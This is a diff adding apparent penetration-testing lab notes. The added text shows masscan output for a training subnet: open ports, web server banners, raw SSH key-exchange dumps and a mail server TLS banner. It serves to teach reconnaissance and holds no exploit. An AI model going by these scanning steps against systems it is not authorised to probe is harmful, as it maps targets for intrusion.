@@ -268,10 +268,151 @@ sec560@560vm:~/Downloads$
 ```
 
 ```
+sec560@560vm:~/Downloads$ head -n 15 /tmp/masscan_10.130.10.0_24_full.txt
+#masscan
+open tcp 80 10.130.10.11 1727151519
+open tcp 80 10.130.10.6 1727151523
+banner tcp 80 10.130.10.11 1727151523 http.server nginx/1.24.0 (Ubuntu)
+banner tcp 80 10.130.10.11 1727151523 title Welcome to nginx!
+banner tcp 80 10.130.10.11 1727151523 http HTTP/1.1 200 OK\x0d\x0aServer: nginx/1.24.0 (Ubuntu)\x0d\x0aDate: Tue, 24 Sep 2024 04:18:42 GMT\x0d\x0aContent-Type: text/html\x0d\x0aContent-Length: 615\x0d\x0aLast-Modified: Wed, 11 Sep 2024 23:16:45 GMT\x0d\x0aConnection: close\x0d\x0aETag: \x2266e224dd-267\x22\x0d\x0aAccept-Ranges: bytes\x0d\x0a\x0d
+open tcp 3389 10.130.10.21 1727151524
+banner tcp 80 10.130.10.6 1727151526 http.server Microsoft-IIS/10.0
+banner tcp 80 10.130.10.6 1727151526 title IIS Windows Server
+banner tcp 80 10.130.10.6 1727151526 http HTTP/1.1 200 OK\x0d\x0aContent-Type: text/html\x0d\x0aLast-Modified: Wed, 11 Sep 2024 23:28:42 GMT\x0d\x0aAccept-Ranges: bytes\x0d\x0aETag: \x2282b3d57a24db1:0\x22\x0d\x0aServer: Microsoft-IIS/10.0\x0d\x0aDate: Tue, 24 Sep 2024 04:18:45 GMT\x0d\x0aConnection: close\x0d\x0aContent-Length: 703\x0d\x0a\x0d
+open tcp 3389 10.130.10.5 1727151531
+open tcp 135 10.130.10.7 1727151534
+open tcp 8172 10.130.10.25 1727151536
+open tcp 5985 10.130.10.21 1727151539
+open tcp 5985 10.130.10.23 1727151539
+sec560@560vm:~/Downloads$ 
+```
+
+```
+sec560@560vm:~/Downloads$ grep -w 'tcp 22' /tmp/masscan_10.130.10.0_24_full.txt
+open tcp 22 10.130.10.22 1727151568
+banner tcp 22 10.130.10.22 1727151599 ssh SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.5\x0d\x0a\x00\x00\x04\x5c\x07\x14(\x82\x18\xf5\xbc\xe4\x9am\xea\xe2s\x00;\xa9\x03 \x00\x00\x011sntrup761x25519-sha512@openssh.com,curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256,ext-info-s,kex-strict-s-v00@openssh.com\x00\x00\x009rsa-sha2-512,rsa-sha2-256,ecdsa-sha2-nistp256,ssh-ed25519\x00\x00\x00lchacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com\x00\x00\x00lchacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com\x00\x00\x00\xd5umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1\x00\x00\x00\xd5umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1\x00\x00\x00\x15none,zlib@openssh.com\x00\x00\x00\x15none,zlib@openssh.com\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04D\x0a\x1f\x00\x00\x01\x97\x00\x00\x00\x07ssh-rsa\x00\x00\x00\x03\x01\x00\x01\x00\x00\x01\x81\x00\xbbQ\xd7\xfc\xc4\x07\x87\x90\xc2f\x84\xc9/C\x1af\xa0\x91\xd9\x89\x7f\xae\x9cS\xab\xc0\xack\xf0\xca\x83[h;\xe4\x00\xf7w\x85\x9b\xe5\x82\x9a\xfc\xee\xd3\x04\x80a\xd2vh\x93\xed\xec\xfd\x96j+\x11Y\x08\xcd\xd6\xfe0K\xb4\x17\x95\xf1N(\xc1\xd8D\xf9s\xe8;|\xaf\xddl`G\xc7fun\x9c\xbc\xad\x8b\xbdT\xf4\x99\x00\x89\xec`\x1b\x88Q\xfa,E\xa5d\x0c\x83\xb0I\x0d\xaab\xc1\xef\xa1$M\x93\x12;\x13\x8a\xc1\xbf\x1c\xbf\xad\x9f\xf2\xeb2\xf4!\x03mN\xe0\xc72v\xae#\x03\xdc\x05\xb4T\x06\x85\xa1\x0e\xba\xc0\xdb\x86\xf4L\x9f\xe5\xc4\x0c\x80\xd8\x83\xdb\xfe\xf5\xde\x92^\xb5\x0f\x26\xd6\x26*0\x88\x8bf\x0b\x86\x1f\x829\xcf]\xd9\x8b\xc9\x97\xc9T*\x91\xe2\xdb\x19\x16\x06 \xbdW\xc4\xef\xcf1\xd4V\xc4F\x1e\xee\x80\xe49\xee%\xb1\x86\xe4\xa4(\xae\xf7\x03(\xa0\x87g\xe8\xfb2\xf9\xa8\x91\x89bN\xba\xadV#\xd9\x99\x97\xb49)\x8b4\xe6\x84\xde\xba\xa3S\xbbe\xf4\x8c\x1a\x9d\x91\xaa$\x9a\x18\x89\xb7Srn\xf7\xaf\xf2m\x1a\x7f\xf0\xf7\xddE\x99\xc9g$\xc1\xecC\xe8\xab\x95\xa9\x16\xd8\x06B\xf4\x8b\xe5@u\xa3@\xeb\xb7\xe7\x8a\xa6\x86\xe15\x1cO\xae\x97\xd5\xcc|\xd2\x92!!\xed;\xaa#d\xae\x12\x8au\x7f\xe8\x05M9\xacKc\xc3h\xee\x3cZ\xe3i\x1a~NQ0\xbed\xbc\x11\xd3\x04~9\xc3T$M\xb6d\xe2)\x8a\xc7\x8d\x11\x15\xc0\xfdtB\x05\x00\x00\x01\x01\x00\xf4\xf6$\x81i\xe7b.\x0eG\xf7\xd1@U2K\xf1o\xee\xf3D\x8a\xa8d\xe5\x8c\xe2\x0fV*n\xf1y\xba\xfc\xd1\x16/\xfc\xe1\xfe[TD\xc9r\x27$\x86\xfe@\x86\x11n\x82\xe6\xeeh\xf0\x80\xa8\xb2\xaa\x9b)\xe0N\x8d\xf4\xe6\xf0q\xbf\xfc\x8a\x0c\x0b\xd1\xd4RJ\x0a\xbeYB^\xb6\x0d\xc4x\xaf\x84\x9b\xf7\xb8\x03\xc9\x17\x82\x8a\x14\xd9\x04A\xb6{1\x82\xf4\xfch\xfa\x13\xef\xcf\x85Y\x3e\x1a\xd2\x9a:\xaaF\xa7\xcb\xfaB\xfc\x18%\x05O\xf1\xd2PL\xd2s\xd3/\x0e\xa4\xffy\xb9\xb1\xeb\x82\x1c\x86\xa2\xe2\x90\xa3\xcaWG?\x0a\x9b\x11\x81\xd4\x09\x90\x0f\xfbF\x89\x18\xb2\x0d\x8e^8PF\xae\x27\xbb\x9a\xc0\x97k^\xa2\x94\x82\x16\xc4f\x9f$\xb3\x1d\xc2\xa9\x1c\x9f-\xe4\xc9*\x1c\x0eD\x91\xc2A\x99q4\xb0z\x93\xffV0\xbc\x7f\xcc\x03RN\xb4f\xf8\xebCn`\xd2g\x96G\x01\xcf\x12aLfO\xa9W\xa0\xdc\xca\xd8\x0d\x22X\x87\x90\xe3\x9c\x00\x00\x01\x94\x00\x00\x00\x0crsa-sha2-512\x00\x00\x01\x80Q7\xda\x08\x82R\xa9\x08\xf2\xf2L\xc9,\x8c\xf2\xe27bCA\xb8:%\xd4\x8c\xbd\x00*\x0aP\xcb\xc1i\xa27E\xdf\xce\xfd~K\xcb\xd9\xf7\x804I\x0e`\xe1\xb0\x8d\xb4\xc7a\xa0\x01\xab\x11;\xda\xd8\xb0\xddHi\x9a\xad\x1a\x0anZ\xf7\xfa\xcf\xb6\xa9\xcc7\xbb\xa2\x81\x26/-\x9b(\x1a_\xbaCd\x17\xb0*`\xee\xae\x05t@S\x12xi;\x984_\xb38\xb7\x09\xaeX\xb8 \x13m\x00\xd9(\x82\x82\xcf,\xe9g\x98\x89(\x88\xb8\xd1\xd2/\x1b\x89\x8a\xae\x1f\x93\xcf~\x1b.\xc5\xa0\x0a\x15\xd4g\xe5\x95\x170\x1e\x95\xf3\xa8\xc8\x92\xa4\x13\xdfO\x13?uQ\xe4\x17\x0b\xf1\xc1\x13\xe4A\xb0\xbc\xfbL[e\x12\x840\xd2\x85\xd6MU\x11\x07\xe5\x81\xa3~\xa9\xae\x1e%\xf7\xc0HS\xc9\x3c\x96\xba\x83\x86\x22S\x19\x16cOtA\xc5\xe7\x9b\x02\xf2\xb0$p\x17\xf5\xf4?\x19f\x1a\xfb\xfe4L$\xb3Yg1\xa9h\xc5\xa4\xa0Vr\x99a$\x17Ef`\x88\xf1\xa1h\xa4\x17\xb7\xb5\xd3\xf7.\xc5 \x09G\xc0\xbf\xa1yC\x1f\x10Jr\xa1@X\x1a*\x8e\xaf\x03\xe1I\xc5\xe8\xb6\xdf\x08:\x09o\xc87%\xf6\xa9\xbd%\xf3\x18\xff\x81\xf5@vj}G\x012\x90\x13T\xf0\x8d\xa7z\xd6Os\xf6MHwh\x04\x10\x8b@\x08\xb2\xc4\xbb\xeb\xb0\x8f\xa6\xcf\xdc\xc9\xb32%n\x9a\xc8;8R\x02\xe5\xdcr\xd2\xe5\xc5\xd5\x88Y\xfd!{\xe8\xd5\x996\x0e!\x81\xbe\xdd5\xbby\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0c\x0a\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x17(\xfb\x90\x8e\xf0\xee\xba\xa9Q\xce\xc5fH)k\xfc\x86\xa7D8\xb1K\xca\x82\xa4\x82h\x93\x0bJ\x1a\x0b\xf0*\xdd\xfdu\x90\x87\xa0\xe7\xc6;\xa7\xd2{\x01A\xc4\xe48\xb5\x1eN\xb2\xa4j\xc7\x01@X4\xe6\x82\xe7\x9d\x27\xd1\xdc\x84i\x05\x9e\x8e\x3c\xb9q\x86hQ\xdbQ\xda\xe8\xe5o\x89r.\xec\xa7\xc2K\xb6|\xf4\x22\xcd\xaa\x9a\xee\x14Zm\x3c\xdf\x88\xef\xf3A\xa9\x07\x01\x11\x0d\x15\x19\x14_\xc6\x13\xc07\xd5\x8ctbwUp\xd4\xa9Bx\xb7\x9d|\x1eb\xbd\xff\xa4\xd2A\x17\xcc\xe8\xb0\x8b\xf7\xc3F\xf6}\xafX\x99!\x08R\xcbw\xe8\xf4\xc3\x80\xb1\xee\x83\xfbs\x11\x92\xd2\xb1[\x1a\x7fh\xbawN\x9a\x1d\xdb\x1f\x0b\xdc\x96\xee\xba\x02\xbah\xcf\xe3\x97\xb3\xee\xf7\xd8\x01\xd9\x99\xa5\x13\xd9\xa3+\xab|\x13k8V
+open tcp 22 10.130.10.10 1727151726
+banner tcp 22 10.130.10.10 1727151759 ssh SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.5\x0d\x0a\x00\x00\x04\x5c\x07\x14\xd9\x8f\xde\xc2\xd5\x05\xcc\x13\xfb\xa9\xe3\xf09cb\xa9\x00\x00\x011sntrup761x25519-sha512@openssh.com,curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256,ext-info-s,kex-strict-s-v00@openssh.com\x00\x00\x009rsa-sha2-512,rsa-sha2-256,ecdsa-sha2-nistp256,ssh-ed25519\x00\x00\x00lchacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com\x00\x00\x00lchacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com\x00\x00\x00\xd5umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1\x00\x00\x00\xd5umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1\x00\x00\x00\x15none,zlib@openssh.com\x00\x00\x00\x15none,zlib@openssh.com\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04D\x0b\x1f\x00\x00\x01\x97\x00\x00\x00\x07ssh-rsa\x00\x00\x00\x03\x01\x00\x01\x00\x00\x01\x81\x00\x91\x81fY\xf3*7\x01)w\xaeJ\xde\xaeB\xa7bfL$\xb2\x82\x9bq\xc4ToB\xd5\x5c\xf8[\xd2\xbf\xb8\xc5\xcd\x0a\xdc\xa5\xacPX\xb8\xa0\xd4\xe1\x08\xean\x8e\x8d\xb8\x8ew\x17\x9a\x17+\xb7;\xda\x18\xc9\xeb\xbf{dV%\x7f+~ \xfaC\xcb\x05%\xb5\xa2\x99d\x89\xb2\xf9\xbe\x10E\xea\xb9B\x83\x1a\x8d\xa7O\xe4\xfe6\x07\x8d\xdb\xf7\x8c7^\xb5\xcaW\xf2Q\xb7\x84\xad!\x1bYs\x83`\x00\x12\x133B\x1b\x02\xcd\x93\x91\xfe\x97\x80\x1e\x0a\x09o\xbb\x07}1\x96{ \xdcC\xfawM\x8eBh\x17\x10\xe9Cx\xb0\xd3\x9d\xac\xae\xa6q\xc6\xc3\xc3\x9c\x14\x99\xbeW\x85\xad\x3c\xd2\xb6\x14\xe8u\xd4\xd2\xceh\xba/,\x9fSi\xee\xce2\x1aKo\xd8Y\xc2\x19h\xf5\xd8\x84FWDY\xba\xc1\xa2\xc1\x072~\xce\xac\xa4f+\xc9\xe6\x08\xa1p\x26\x1fR\x9e\xdf\x05\xa3J\xc3\x88\x9b\x8a\xea\xd5\x9f\xc2\x9b\xc4\xcbU\xed\xb6\xae\x8f\x09\x17\x04=_\xa5 9\xd0\xdd^1\xf1\xbc\xc9\x22\xbci/\x9c\x03\x18L\xa9\x922i\x10K\xf1\x3c\x97\x3cw\x8d\xe1\xadw\xab\xc8 \x0a^Y\xae\xa5\x84S\xc5R\xad\x1d\xd7\xf4\xf9\xa5XA\xa1\x91K\xeb[2d\x3e\xb6CKyax\xbc\xe8\x05\xabb\x5c\xcdQu\x8c\xec@nLNU\x1e\xaf\xa5\xf4\x1d\x1c\x90\x13v\x18\x0cZ,3\xb3\x15\xbcs)\x8d@\xb8\x97U\xf1\x8b\xc8\x00M\xa7^\x5cH2\xf5\xe8\xd4\x8b\xd9\x1d\xae\x1e\xc9nT\xd9\x00\x00\x01\x00X~\xa8n\x1a\xafN\x0f\xb7\xd5\x3eE\xf7\x8ec(\x3c\xed\x26h\xee\x8e\x02\xb0+]\xf4\xee\x1a\xf3\xa4\xe9\xc4|\xe8\xe6\xe8S*\x85g\xbbT\x01\x0a\xa5\xa5\x87\xc8\xec\x27\xec\xac\xcd#7\xc9\xe7xt\x983\x93\x01\xfe\x98;\xb7]#\x9b\xf4P\xbc\xe1\xf3i\xc6*\xd3\x1c\x91\x1af\xd2\xe8\xdd\x9cr\xb7\x89b_\xd6\xdal\xae\x1dU\xb2\x16\x9c\xa3\xf0\xbf\xa4?\xcb\xcd\x9b\xf1k\x85\xcb\xd19\xb8\xf3\xf3qI\xeeeVb\xde\xc2dz\x0bw=\xda\xfd\xec\xca\x8f\x8f\xec4\xfb\x95\xb0\xe4\x188\xc5\x1b\xe6\x95\xf3\xado\xb0V\xf3\x9c!\xd3\xdc\x7f\x0f\x1d\x11y\x88\x0b\xd9\xa7\x10\x95\x18K\x15\x94\x92\xfe\x13\xc4\xac\xda%\x86\x06w\x1a\xe9\x90:\xe1kQA\x0b\xbb\xb2$\x04\xd5Z\x91Q2\xe0\x5c\x0d\xc7\xe3+tp\xf8\x8f\xa1\xdcu\xe4\xbd\x90\xcf\xcc\x8b\x19K\x27\xe4\x04l\x3c\x04r\x06T\xe2@\x172\xb1,\xf2U\xdd\xa8\x89\xc1^I\x90\x90\x0f\x8d\xdd.\x99\xabq\x00\x00\x01\x94\x00\x00\x00\x0crsa-sha2-512\x00\x00\x01\x80\x22\xcd\xd1\xd2\x87n\xcb\xe2(1\xedl\x05^\x86J\xa2}\xc7\xeaZ\x00\xf6\xd3\xb5\x075t\x26\xf79.\x05d\xe5\x81r\xb9\xf8.`h\xae\x0d\x18\x0d\x99\xaa\xf5\xb8\x05y\xd6\x88\x91\x97\x86#Qk\x9c\xe0\x8e\xe4}\x3c\xd8\xaf\xc6\xf7\x0c\xdd\xfe,t\x09q\x80\xc2\xf30\xd3z\x7f\xb3\xc8\xf7x7\xeblr\x11\x9c\x12t\xe4\x866\xa2L\xfa\xc4zo\x955\xa6~\xecc\xed\xf9\xad\x98\xa7\x8fu\x164\xf6VA\xd7\xb7\xe8dz\xc6=\xd0Z\x11\x27\x98\xf9*\xb9\x1e#\xaa\xed\x98\x17)\xb3\xe7}\xc7\xd5\x16h\xe2C\xa8\x0a0\x98re\xc3Jq\xe82\x87\xb9c\xaeFs*\xd9\x22\x19\xb6\xd9\xe7N\xb1r$\x06q\xa0E\x05\x88\xaeQ\x8a\xd4d\x0az\xb9L\xa2$\xd2\xe3M|\x00\xea\x27\x93\x030\x12J\xe3\x9a\xcf6\xe3\x13\xd2\xbd\xa6sL\x1c\xdei4\xa7\xdb\xe8\x92\x10\xac \xbd\x88W\xe3\xf5\xd9q\x0a\xec\xa4\xe4\xe9\xc3\x95{G\xd2\xaf+\x8e\x14\x9d.\x07o\x10J\xe5\xfcY\xf3\x92(\xdd\x16d\xf7\x18K~\xc9\xc3w\xce\x17\x26\xfd\x02\x1c\xee\x08\xde\xc8\x27\xc9P\xeb\xab8\xad\x11@\xbc\x07[\x81\xf8N\xb0\x83\x94\xdf,R]g\x0f\xc7*\xe5\xb8\xbe\x92+u\xc7\xb7GF2\x19\xe1#@\x9b\xdc%v\xc3\x0f\xf9\xa0\xdb\xfc_\xd9\x1c\xf5\xf3f\x05\xbfR^\x99\xda]\xea.R\x0a\x9eY\x13\xbf\x1f\xd6\xe9\x26\x9a\x86\x9c9\x8e\xe6.\xe4\xb3\xaa\x0fQN\xf52\xab\x0c\xf8\x10-\xf5\x8c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0c\x0a\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00~\x00e\xe5\x16\xc1F\xedD\xe1{.u#\x95\xa7\xfd\xf8~(\x9e\xe4\xdej\x22\xff\x13\x0au\x9a\x90\x01w\x0d\xba\xa6\x26e\xfd\xaf\x5c\x93\xd2{\xdc-`:\xfd\x01?\x18W\x1d\x09\x1d/\xbf\xe7\x07\xe4\x5cce\xe9\x82\x3c\xc5\xd3\xa8\x91\xb9\xb9\xe1f\x83\x8e\xb2\xbe\x0eL\xf7\xdaD\xa41W\x18\x954\x95\x92%\xbdA\xf94=A\xc3hi\xf6]\x9d\x0b\x0d\x9b\x05\xa5\x87\x16\x8c\x98\xc4\x06\xd4\x00\xf7d\xc5\xd4i\xe4\x8b\xe2 \xed\x1f\x0a\xfc\xca\x5c\xb1r\xe1\xaaD\xa7\xe6\x8f\xd9\xe4\xf3\xe4\x8c\x3c\x13T\x95;\x99\xd2k\xc1\xab\x06\xe9\x1cc\x1b@:\xeb\xfe4|\x9e0\xa6\xf2\xb0\xd4b\x87%\xffD?3H \x99\xb9\xa7\x14\xd1\xa1\x80\x3e\xcd*\xb0\x97\x14\x1biw\x00\xc9i\x91M\x8d\x92\x8c\xc2\x99m\xfd\x17\xaf\xcb\xa9\xd9\xa3
+open tcp 22 10.130.10.11 1727151815
+banner tcp 22 10.130.10.11 1727151849 ssh SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.5\x0d\x0a\x00\x00\x04\x5c\x07\x14\xe6s=A;\xa1\xfb\xe9\x22\xae\xbcz\x86\x87\x18O\x00\x00\x011sntrup761x25519-sha512@openssh.com,curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group16-sha512,diffie-hellman-group18-sha512,diffie-hellman-group14-sha256,ext-info-s,kex-strict-s-v00@openssh.com\x00\x00\x009rsa-sha2-512,rsa-sha2-256,ecdsa-sha2-nistp256,ssh-ed25519\x00\x00\x00lchacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com\x00\x00\x00lchacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr,aes128-gcm@openssh.com,aes256-gcm@openssh.com\x00\x00\x00\xd5umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1\x00\x00\x00\xd5umac-64-etm@openssh.com,umac-128-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512-etm@openssh.com,hmac-sha1-etm@openssh.com,umac-64@openssh.com,umac-128@openssh.com,hmac-sha2-256,hmac-sha2-512,hmac-sha1\x00\x00\x00\x15none,zlib@openssh.com\x00\x00\x00\x15none,zlib@openssh.com\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04D\x0a\x1f\x00\x00\x01\x97\x00\x00\x00\x07ssh-rsa\x00\x00\x00\x03\x01\x00\x01\x00\x00\x01\x81\x00\xec\xc8C\xd6\xeb\xbe\x83%\xa74\xbc\xa9 r\xff\xaf\x17j\x9c1\xf0\xb7\x82\xfa\x84\xd7\xe0L\xc7\xfd;3\xfe\xd9!\xbf\xc2Uo\x90\x05\xadg\xa5\x942\x8fc\x16t\x0a\x88\xac\xb7\xbf\xf7\xda\x0c\xebC]\xcf\xa3\x81\xf0\x94\x0f\xa3\x89\xf2\x0f\xdb\xe1\x9d\xf8]i\xb4A\xa0\x18:\x8a\xb7\xff\x93\x8d\x1b\x87e7\x06Oh\x81\x3ejiuE\xda\x94\xac\xd0\x7fL\xc5\x1b\xc8\xbat\xfa\xa3\x03\xad\x09)!\xf1\x0a\xc0\x8c\xb4\xe6\x1b\x05\xfc\xbc\xa9;\x9f\x86\xd4\xe8\xf4}\x08E|\xa3\x0f\xc1\x1b\x18\x87\xde\xcf\xa8\xc0\xde\x17\x3c\xf8W\xff\x0d\xde\xac\x11~)\x0a\xc6\xa3\xe6|g\xe0\xf0R\x95X\xb9+\xb5z\xea\xd5h\xa8\xf8\x88QN\xa4\x27\x0e\xcc\xab\x27\xf6\xaa\xdae\xf6\x0d\x8aC\xad\xf5\x192\x13\xc7\x8f:\x99\x0b\xf1\xa2\x9f1\x8b\xf1Z\x85\x26\x1b\x27\xb8E\xcey\xe6\xf0S\xc6\xa3F\xa2\x0f\xa7kt;h\x96=o\x22\xb7n\xafB\x94m\xe97]\xab\x8a\xd4\xa7\x19\x8d\x11\x0c\x18\x922\xa1\xc3\x18\xd6\xe2h\x95\x9b\xdf\x00A\xceO\x0d5fR\xa9^\xe9\x3e\x7f\x15\xe7y6`-\x26\x90\x278\xc6\xb5}h\xe2\x11n\x85B(g,\x83\xa0sW\xdf\xc5\xe6o_\x83u-S\x5c\xbb\xaf\xb6n\x0bK\x84\x86v\xb3\xbb\x9e(3\x98U\xc5\x10jX[\xd9\x17\xa0\x1a\xff\xeb\x1a\x262\xef{\xc8\xc4\xff\xc7\x1dC\x07\xefX\x18\xdc\xb5W\xee\xc0\x95v\x1cNky\xfei\xf3)\x22\xb23G\xd8\x9b\xe05\xfd\x00\x00\x01\x01\x00\xe1\x27\x958\xad\xee\x86]\x98\xc1m6\x1a\x9a\xd7\x9cF\x9c\xa4]\xd3U\x80\xee{=\xfc\xd8\x9c\xeeL\xae\xc0YH\x96M\x85\x947\x0ee\x0eP\x98k4\xc6\xb2\xee\x09Z9\x8d\xee\x04\xd5\xfa\x0c\x97i\x97\x0d\x06\x11Xg\xfc\xe1\xd9\xb7\x09\xcb\xb3E\xda\xf5\xacg\x1a\x0f\xa5\xcb\xb3\xed\xabo\x89\xfd?\x3e\x9bW\xe3!4D\x021,\xc7\xef\xd10\xf4\x9dL\xd2\x14\xc6n\xb3\x07\xe8\xb09\x5c\x98DU\x82\x0c#\x0c]\xdf\xa3|\xe9^Gqi\xef~\xf5\xf3\xf9\xe5\xedPm)\xa3\xbaF\xafS\x8c\x9fas\xa0\x0a5h\xb8bU2\xb07\xf8\x88W\x17\x15P\x8e\x0bJKK3\x86\x988\xabOy\x02\x14Mq\xd6Y\xe8\x9f\x81\x06\x91!\xad\xe3\xfes\xeb\x0a-\x1c\xa0\xe5Y\x8f\xd9|\x9e\x90\xb2\xae\xbb\x1f\x89\xf3\xe2\xf9\x94\xfc\xa2\x9c\xdd\xa1!\xd8Qn\xe0\xd3\x26P\xfc\xc6\xe1\x09\x0c6AwT\x0d2\x85\xa78\xc9G\xf6\x18H\xb5B\xfa\x85[M\x26\x00\x00\x01\x94\x00\x00\x00\x0crsa-sha2-512\x00\x00\x01\x80\xa4\xfe\x84B\xe5\xb5\xf2\x5c\xd3Q\xa4n\xbb\xfep\x04\x1e\x89_)\xeb\xa1\xea\x8dh\x89\x16fu\x17\xf3\xdd\xee\xa2\xa7\x8a\x8b\x10\x0b\xc4g\xbe \xb7\xb2A\x97\xd8\xc9\xd9\xa3\x5c\xbe\xb6\x22p\xd7\x89:\xe3kEuF\x8bO\xbdR\xd1\xb8\x85!}\x08b\xe5\xd0({|\xefd\xda\x12\xc1.\x22\x9c\x86\xe9GI\xe6\x0f\xe0\xb2\x08A\xc6\xb0\xc2,\xbb\x88\xbf}\xed\xddd\xe7\x00\x8f\xed\xd6\xf3B\x88z_\xb6\x8d\x91k\x1a\x9076\xaf$z{\x27\xf7d\xd5.\xc3v{\xc0\xad\x0f\x96\x3e9\x8aF\xb8h\xd4\xb0\xd2g\x8a\xafk\xc5T8\x17\xc8Y\x04\xcb\xfe\x0d\xc6\xc8\xa1.\x19\x1d\xcc\x98\xed7\x19X\x26\xfc\xf7b0\x26\xb4\xd0\x82*U\x84b\x08\xc1\x98\xce\xb5\xbcn\xa7 ]\xf9\x0c\xb0\xe4\x0825X\x9d*\x0ci\xd3\xa0\x0a.M(\xb9\x17fgO\xa6\x18\x0b\xba[\x07\xbb\xdb\xcei\x22\x09w\xafA\xb6\xb1\xd8\x9f\x98\x0f\x98K\x9bsa\xf5^ht\x0b\xfd\xd9@\xd4\xcb\xae\xe9,\x0610\xca\x17\x1d\x0b\x9f\x8c.\x9aD\xa4\xfe\x86\x12\xa2\x08,|\xe5\x8c2\x8f\xf0\x9dUx\x7f\xf8~x#m/\x9cz\x97\x85L\xd1-\x1a\xb8F\xf7X\xd6A\xc9\x94\xc5G\x3e\xdfC\x0a*\x9e\x9b5\xb0*\xa6\x04\x0a\x8b\x80~\x19\x14\xe8\xbf\xd2(\xd3\xe9\xae\xe3!iu\xfb q\xb4\xcb\xa6\x7f\xf3\xadM\xb9\x9aI\x0b\xb4r\xc9\x88)e\x09=P_\xab\xab\x99#\xe4\x15K\xbfa\xaa\xbe\xf6\x07\xe5\xb6\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0c\x0a\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00O\x9d\x8a\xbc\x0c\x14\x08O\xa6\xb4\xc2\x0aY.\x0f6\xae\x04\xb4|\xd264t\xfa\xf3\xd9\x91}\xc3E\xe4l\xd3\x86?\xb9\xfe\x9b:W\xbaD2\xb9w\xb2\xbbH},w\xc4\xd3N+\xa8a\x0c0\x8a\xe3,\x13P\x0f\xde\x82\x84k\x90\xb7\x92x\xd1\xc5\xd8Z\x12\xefy\xa6\xa0\xf7\x03R\xb7\xe36\xe0U\xa8\x83\xee\xb2\xad4_\xb8\xd3\x07\x02n9\x03\xa9\x11\xa7\x14\x98\xae\xd3\xd1\x9f\xe3\x1f\x06\xdc\x3e=,\x8ba\x10V\xec\xf5\xda\x14K\x01\x18\x5cVgJ\xfb{\x94(\x1e+\xc5GN\xa2_\xf6Un\xda\xea\xb3x\xc1\x97\xf0L\xc5\x82\xc6\xd21\xd9f\xba\xba\xd3\xbb\xe4\xf788\xfe\xbe!\xdev\xd3\xadA\x09\x07\xeb\x85\x0ax\xc4\x83\x9c\xa9H\xd3\xb8\xb8/ \xd4\xa1\x3cD\x0a\x86\x18\xa9\xd5\x85]\x18\x882\x95\xa9\xb6[\xd9
+sec560@560vm:~/Downloads$ 
+```
+
+```
+sec560@560vm:~/Downloads$ grep -w 'tcp 25' /tmp/masscan_10.130.10.0_24_full.txt
+open tcp 25 10.130.10.25 1727151674
+banner tcp 25 10.130.10.25 1727151706 ssl TLS/1.2 cipher:0xc030, mail01, mail01, mail01.hiboxy.com
